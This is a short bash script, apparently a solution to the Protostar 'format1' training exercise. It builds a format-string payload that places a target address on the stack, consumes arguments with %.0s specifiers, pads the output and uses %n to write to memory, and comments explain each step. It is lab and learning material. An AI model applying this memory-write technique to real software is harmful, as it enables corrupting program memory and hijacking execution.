#!/bin/bash
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

# Show what is on the stack
# You can use the following command to display the stack in ascii:
#/opt/protostar/bin/format1 "`./exploit_format1.sh`" | xargs -n 1 echo | xxd -r -p
#stack="`printf ' %%08x%.0s' {1..200}`"

target=`$DIR/encode_switch_endianness.sh 80496e4`

# Now we want to make the `target` variable the last printed `%x`
# so we can then change it to `%n` and write to the memory

# AAAAs to recognize where our string is in the memory,
# _target_ to use as the pointer
# A series of %.0s to consume "arguments" from the stack preceding our target
stack="AAAA${target} %.0s %.0s %.0s %.0s"

# We want to write the value 64, so make sure we've written 64 characters
# %.0s are removed, so we need to make sure to add it 4*4 = 16
stack="`$DIR/pad.sh 80 D \"$stack\"`"

# Finally, add the culprit to write the value to our target
stack="${stack}%n"

# Pad the output so the stack doesn't move around
$DIR/pad.sh 998 C "$stack"
